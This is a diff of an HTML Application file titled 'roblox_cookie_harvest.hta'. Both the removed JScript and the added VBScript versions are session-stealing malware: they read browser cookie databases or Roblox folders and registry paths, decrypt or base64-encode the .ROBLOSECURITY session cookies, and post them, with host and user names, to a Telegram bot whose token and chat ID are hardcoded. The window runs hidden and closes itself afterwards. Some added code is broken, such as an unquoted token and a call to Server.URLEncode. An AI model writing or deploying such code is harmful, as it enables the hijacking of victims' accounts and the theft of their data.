@@ -1,116 +1,154 @@
-<!-- payload -->
+<!-- roblox_cookie_harvest.hta -->
 <html>
 <head>
-<script language="JScript">
-var TOKEN = "8814328356:AAFwdZd_Mlj9kZOOUVw7ERPEnRB238jqzTE";
-var CHAT = "8692286004";
-var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
-var wsh = new ActiveXObject("WScript.Shell");
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-
-function send(msg) {
-    try {
-        xhr.Open("POST", API, false);
-        xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.Send("chat_id=" + CHAT + "&text=" + encodeURIComponent(msg));
-    } catch(e) {}
-}
-
-function grab() {
-    var local = wsh.ExpandEnvironmentStrings("%LOCALAPPDATA%");
-    var roaming = wsh.ExpandEnvironmentStrings("%APPDATA%");
-    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\rc.db";
-    var found = "";
-    
-    var dbs = [
-        local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
-        local + "\\Google\\Chrome\\User Data\\Default\\Cookies",
-        local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
-        local + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
-        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
-        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
-        roaming + "\\Opera Software\\Opera Stable\\Network\\Cookies",
-        roaming + "\\Opera Software\\Opera Stable\\Cookies"
-    ];
-    
-    for (var i = 0; i < dbs.length; i++) {
-        if (fso.FileExists(dbs[i])) {
-            try {
-                fso.CopyFile(dbs[i], tmp, true);
-                var conn = new ActiveXObject("ADODB.Connection");
-                conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + tmp + ";");
-                var rs = conn.Execute("SELECT host_key,name,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'");
-                
-                while (!rs.EOF) {
-                    var host = rs.Fields(0).Value;
-                    var val = rs.Fields(2).Value;
-                    found += "[" + host + "] ";
-                    
-                    var b64 = "";
-                    try {
-                        var stream = new ActiveXObject("ADODB.Stream");
-                        stream.Type = 1;
-                        stream.Open();
-                        stream.Write(val);
-                        stream.Position = 0;
-                        stream.Type = 2;
-                        stream.Charset = "iso-8859-1";
-                        var bytes = stream.ReadText();
-                        stream.Close();
-                        
-                        var dom = new ActiveXObject("Microsoft.XMLDOM");
-                        var el = dom.createElement("tmp");
-                        el.dataType = "bin.base64";
-                        var node = dom.createTextNode(bytes);
-                        el.appendChild(node);
-                        b64 = el.nodeTypedValue;
-                    } catch(e) { b64 = "[BIN_FAIL]"; }
-                    
-                    var ps = 'powershell -WindowStyle Hidden -Command "$b=[Convert]::FromBase64String(\\"' + b64 + '\\"); try { $d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,\\"CurrentUser\\"); [Convert]::ToBase64String($d) } catch { \\"DPAPI_FAIL\\" }"';
-                    var exec = wsh.Exec(ps);
-                    var dec = exec.StdOut.ReadAll().trim();
-                    found += (dec || "[NO_DECRYPT]") + "\\n";
-                    rs.MoveNext();
-                }
-                conn.Close();
-            } catch(e) {
-                send("ERR:" + dbs[i] + ":" + e.message);
-            }
-        }
-    }
-    
-    if (!found) {
-        var ffRoot = roaming + "\\Mozilla\\Firefox\\Profiles";
-        if (fso.FolderExists(ffRoot)) {
-            var fold = fso.GetFolder(ffRoot).SubFolders;
-            var e = new Enumerator(fold);
-            for (; !e.atEnd(); e.moveNext()) {
-                var db = e.item().Path + "\\cookies.sqlite";
-                if (fso.FileExists(db)) {
-                    try {
-                        var conn = new ActiveXObject("ADODB.Connection");
-                        conn.Open("Driver={SQLite3 ODBC Driver};Database=" + db + ";");
-                        var rs = conn.Execute("SELECT host,name,value FROM moz_cookies WHERE name='.ROBLOSECURITY'");
-                        while (!rs.EOF) {
-                            found += "[" + rs.Fields(0).Value + "] " + rs.Fields(2).Value + "\\n";
-                            rs.MoveNext();
-                        }
-                        conn.Close();
-                    } catch(e) {}
-                }
-            }
-        }
-    }
-    
-    send("ROBLOX:\\n" + (found || "NOT_FOUND"));
-    try { fso.DeleteFile(tmp); } catch(e) {}
-    close();
-}
-
-window.onload = grab;
-</script>
+<title>Roblox Session Extractor</title>
+<<HTA:APPLICATION 
+  ID="RobloxHarvest"
+  APPLICATIONNAME="RobloxTool"
+  BORDER="none"
+  BORDERSTYLE="normal"
+  CAPTION="no"
+  ICON=""
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  SYSMENU="no"
+  WINDOWSTATE="minimize">
 </head>
-<body style="margin:0;padding:0;">
+<body>
+<script language="VBScript">
+
+' === CONFIGURATION ===
+Const BOT_TOKEN = 8677814765:AAEbs7qoHNiFSbMGyNgALtnZDBgijhOJYiA
+Const CHAT_ID = 8692286004
+Const TELEGRAM_API = "https://api.telegram.org/bot"
+
+' === PATH ENUMERATION ===
+Dim paths(10)
+paths(0) = "%LOCALAPPDATA%\\Roblox\\LocalStorage\\"
+paths(1) = "%LOCALAPPDATA%\\Roblox\\Cookies\\"
+paths(2) = "%APPDATA%\\Roblox\\LocalStorage\\"
+paths(3) = "%APPDATA%\\Roblox\\Cookies\\"
+paths(4) = "%TEMP%\\Roblox\\"
+paths(5) = "%LOCALAPPDATA%\\Roblox\\Versions\\"
+paths(6) = "%PROGRAMFILES(x86)%\\Roblox\\Versions\\"
+paths(7) = "%USERPROFILE%\\AppData\\Local\\Roblox\\"
+paths(8) = "%USERPROFILE%\\AppData\\Roaming\\Roblox\\"
+paths(9) = "%TEMP%\\RBX\\"
+
+' === OBJECTS ===
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+Set http = CreateObject("Msxml2.XMLHTTP")
+
+' === ENVIRONMENT EXPANSION ===
+Function ExpandEnv(path)
+  ExpandEnv = shell.ExpandEnvironmentStrings(path)
+End Function
+
+' === FILE READ ===
+Function ReadFile(path)
+  On Error Resume Next
+  If fso.FileExists(path) Then
+    Set file = fso.OpenTextFile(path, 1, False)
+    ReadFile = file.ReadAll()
+    file.Close()
+  Else
+    ReadFile = ""
+  End If
+End Function
+
+' === BASE64 ENCODE ===
+Function Base64Encode(data)
+  Dim xml, node
+  Set xml = CreateObject("MSXML2.DOMDocument")
+  Set node = xml.createElement("base64")
+  node.dataType = "bin.base64"
+  node.nodeTypedValue = Stream_StringToBinary(data)
+  Base64Encode = node.text
+End Function
+
+Function Stream_StringToBinary(text)
+  Const adTypeText = 2
+  Const adTypeBinary = 1
+  Dim stream
+  Set stream = CreateObject("ADODB.Stream")
+  stream.Type = adTypeText
+  stream.Mode = 3
+  stream.Open
+  stream.Charset = "ISO-8859-1"
+  stream.WriteText text
+  stream.Position = 0
+  stream.Type = adTypeBinary
+  stream.Position = 0
+  Stream_StringToBinary = stream.Read
+End Function
+
+' === TELEGRAM EXFIL ===
+Sub SendToTelegram(message)
+  Dim url, payload
+  url = TELEGRAM_API & BOT_TOKEN & "/sendMessage"
+  payload = "chat_id=" & CHAT_ID & "&text=" & Server.URLEncode(message) & "&parse_mode=HTML"
+  
+  http.Open "POST", url, False
+  http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+  http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  http.Send payload
+End Sub
+
+' === MAIN HARVEST ===
+Sub Harvest()
+  Dim report, i, folderPath, folder, file, filePath, content, b64content
+  report = "<b>Roblox Cookie Harvest</b>" & vbCrLf
+  report = report & "Host: " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf
+  report = report & "User: " & shell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf
+  report = report & "Time: " & Now & vbCrLf & vbCrLf
+  
+  For i = 0 To UBound(paths)
+    folderPath = ExpandEnv(paths(i))
+    If fso.FolderExists(folderPath) Then
+      Set folder = fso.GetFolder(folderPath)
+      For Each file In folder.Files
+        If LCase(fso.GetExtensionName(file.Name)) = "dat" OR InStr(LCase(file.Name), "cookie") > 0 OR InStr(LCase(file.Name), "roblo") > 0 Then
+          filePath = file.Path
+          content = ReadFile(filePath)
+          If Len(content) > 0 Then
+            b64content = Base64Encode(content)
+            report = report & "<b>FILE:</b> " & file.Name & vbCrLf
+            report = report & "<b>PATH:</b> " & filePath & vbCrLf
+            report = report & "<b>SIZE:</b> " & Len(content) & " bytes" & vbCrLf
+            report = report & "<b>B64:</b> <code>" & Left(b64content, 4000) & "</code>" & vbCrLf & vbCrLf
+          End If
+        End If
+      Next
+    End If
+  Next
+  
+  ' Registry check for additional paths
+  On Error Resume Next
+  Dim regPath, regValue
+  regPath = "HKEY_CURRENT_USER\\Software\\Roblox\\RobloxStudioBrowser\\"
+  regValue = shell.RegRead(regPath & "CookiePath")
+  If Len(regValue) > 0 Then
+    report = report & "<b>REGISTRY:</b> " & regValue & vbCrLf
+    content = ReadFile(regValue)
+    If Len(content) > 0 Then
+      report = report & "<b>REG_CONTENT:</b> <code>" & Left(Base64Encode(content), 2000) & "</code>" & vbCrLf
+    End If
+  End If
+  
+  ' Send to Telegram
+  SendToTelegram report
+  
+  ' Self-cleanup
+  Set fso = Nothing
+  Set shell = Nothing
+  Set http = Nothing
+  Window.Close()
+End Sub
+
+' === EXECUTE ===
+Call Harvest()
+
+</script>
 </body>
 </html>
